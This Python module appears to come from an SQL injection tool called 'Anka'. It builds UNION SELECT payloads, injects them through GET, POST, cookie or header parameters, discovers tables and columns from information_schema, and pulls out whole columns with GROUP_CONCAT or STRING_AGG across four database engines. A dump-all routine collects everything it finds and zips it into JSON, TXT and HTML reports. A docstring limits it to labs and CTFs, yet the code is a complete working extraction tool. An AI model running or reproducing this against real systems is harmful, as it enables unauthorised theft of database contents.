"""
Data extraction via UNION-based injection against information_schema
(MySQL / PostgreSQL / MSSQL / SQLite). For lab/CTF-style targets only.
Supports single-table dump, single-column dump, and dump-all -- tables and
columns are always auto-discovered from information_schema/sqlite_master;
no manual schema/table name is ever required to run a dump.
"""

import json
import os
import re
import time
import zipfile
from urllib.parse import urlparse

from core.http_client import inject_value
from core.payloads import INFO_SCHEMA_QUERIES
from config import DUMP_DIR
from core import logger


def _union_extract(client, point, columns: int, extract_index: int, sql_query: str):
    select_list = ["NULL"] * columns
    select_list[extract_index] = f"({sql_query})"
    payload_value = f"' UNION SELECT {','.join(select_list)}--"
    params = point.get("params", {})
    if point["location"] == "GET":
        p = inject_value(params, point["name"], payload_value)
        resp, _ = client.send("GET", point["base_url"], params=p)
    elif point["location"] == "POST":
        p = inject_value(params, point["name"], payload_value)
        resp, _ = client.send("POST", point["base_url"], data=p)
    elif point["location"] == "COOKIE":
        cookies = inject_value(point.get("cookie_base", {}), point["name"], payload_value)
        resp, _ = client.send("GET", point["base_url"], params=params, cookies=cookies)
    else:
        headers = inject_value(point.get("header_base", {}), point["name"], payload_value)
        resp, _ = client.send("GET", point["base_url"], params=params, headers=headers)
    return resp


def _extract_candidates(resp) -> list:
    if resp is None:
        return []
    return sorted(set(re.findall(r"[A-Za-z_][A-Za-z0-9_]{2,}", resp.text)))


def dump_tables(client, point, dbms: str, columns: int, extract_index: int = 0) -> list:
    queries = INFO_SCHEMA_QUERIES.get(dbms)
    if not queries:
        logger.warn(f"No information_schema mapping for DBMS '{dbms}'")
        return []
    logger.info(f"Dumping table names via UNION (dbms={dbms})")
    resp = _union_extract(client, point, columns, extract_index, queries["tables"])
    candidates = _extract_candidates(resp)
    logger.warn(
        "Table names must be visually confirmed from the raw response; "
        "Anka surfaces candidate identifiers found in the page body."
    )
    return candidates


def dump_columns(client, point, dbms: str, table: str, columns: int, extract_index: int = 0) -> list:
    queries = INFO_SCHEMA_QUERIES.get(dbms)
    if not queries:
        return []
    sql_query = queries["columns"].format(table=table)
    logger.info(f"Dumping columns for table '{table}' via UNION (dbms={dbms})")
    resp = _union_extract(client, point, columns, extract_index, sql_query)
    return _extract_candidates(resp)


def dump_column_values(client, point, dbms: str, table: str, column: str, columns: int, extract_index: int = 0) -> list:
    """Extract raw values of a single column via GROUP_CONCAT/STRING_AGG-style
    aggregation so the whole column comes back in one response."""
    if dbms == "MySQL":
        sql_query = f"SELECT GROUP_CONCAT({column} SEPARATOR 0x2c) FROM {table}"
    elif dbms == "PostgreSQL":
        sql_query = f"SELECT STRING_AGG({column}::text, ',') FROM {table}"
    elif dbms == "MSSQL":
        sql_query = f"SELECT STRING_AGG(CAST({column} AS VARCHAR(MAX)), ',') FROM {table}"
    elif dbms == "SQLite":
        sql_query = f"SELECT GROUP_CONCAT({column}) FROM {table}"
    else:
        logger.warn(f"Column value aggregation not implemented for DBMS '{dbms}'")
        return []

    logger.info(f"Dumping values of {table}.{column} via UNION (dbms={dbms})")
    resp = _union_extract(client, point, columns, extract_index, sql_query)
    if resp is None:
        return []
    return [resp.text]


def dump_all(client, point, dbms: str, columns: int, extract_index: int = 0, max_tables: int = 25) -> dict:
    """
    Walk every discoverable table, then every discoverable column in each
    table, then attempt to pull raw values for each column.
    Returns {table_name: {column_name: [values]}}.
    """
    logger.critical(f"DUMP-ALL requested against dbms={dbms} — this issues many requests.")
    result = {}
    tables = dump_tables(client, point, dbms, columns, extract_index)[:max_tables]
    if not tables:
        logger.warn("No candidate tables found; dump-all aborted.")
        return result

    for table in tables:
        logger.info(f"--- Table: {table} ---")
        cols = dump_columns(client, point, dbms, table, columns, extract_index)
        result[table] = {}
        for col in cols:
            values = dump_column_values(client, point, dbms, table, col, columns, extract_index)
            result[table][col] = values
            logger.ok(f"{table}.{col}: {values[:1]}")

    return result


def _host_slug(url: str) -> str:
    host = urlparse(url).netloc.split(":")[0] or "target"
    return host


def save_dump_bundle(target_url: str, dump_data: dict) -> str:
    """
    Persist dump-all/dump-table results into dump/<host>.anka/ as
    per-table JSON/HTML/TXT files, then zip the whole folder into
    dump/<host>.anka.zip (e.g. example.com.anka.zip) as requested.
    Returns the path to the zip file.
    """
    host = _host_slug(target_url)
    folder_name = f"{host}.anka"
    folder_path = os.path.join(DUMP_DIR, folder_name)
    os.makedirs(folder_path, exist_ok=True)
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

    json_path = os.path.join(folder_path, f"{host}.anka.json")
    with open(json_path, "w", encoding="utf-8") as fh:
        json.dump({"target": target_url, "dumped_at": timestamp, "tables": dump_data}, fh, indent=2)

    txt_path = os.path.join(folder_path, f"{host}.anka.txt")
    with open(txt_path, "w", encoding="utf-8") as fh:
        fh.write(f"Anka dump - target: {target_url} - {timestamp}\n")
        fh.write("=" * 70 + "\n")
        for table, cols in dump_data.items():
            fh.write(f"\n[TABLE] {table}\n")
            for col, values in cols.items():
                fh.write(f"  {col}: {values}\n")

    import html as _html
    rows = []
    for table, cols in dump_data.items():
        for col, values in cols.items():
            rows.append(
                f"<tr><td>{_html.escape(table)}</td><td>{_html.escape(col)}</td>"
                f"<td>{_html.escape(str(values))}</td></tr>"
            )
    html_path = os.path.join(folder_path, f"{host}.anka.html")
    with open(html_path, "w", encoding="utf-8") as fh:
        fh.write(
            "<!DOCTYPE html><html lang='tr'><head><meta charset='utf-8'>"
            f"<title>Anka Dump - {_html.escape(host)}</title>"
            "<style>body{font-family:sans-serif;background:#0f1115;color:#ddd;margin:2rem}"
            "table{border-collapse:collapse;width:100%}th,td{border:1px solid #333;padding:6px;"
            "text-align:left;vertical-align:top}th{background:#1c2028}</style></head><body>"
            f"<h1>Anka Dump — {_html.escape(target_url)}</h1><p>{_html.escape(timestamp)}</p>"
            "<table><tr><th>Table</th><th>Column</th><th>Values</th></tr>"
            + "".join(rows) + "</table></body></html>"
        )

    zip_path = os.path.join(DUMP_DIR, f"{folder_name}.zip")
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for fname in (json_path, txt_path, html_path):
            zf.write(fname, arcname=os.path.join(folder_name, os.path.basename(fname)))

    logger.ok(f"Dump bundle written: {folder_path}/ (+ {zip_path})")
    return zip_path
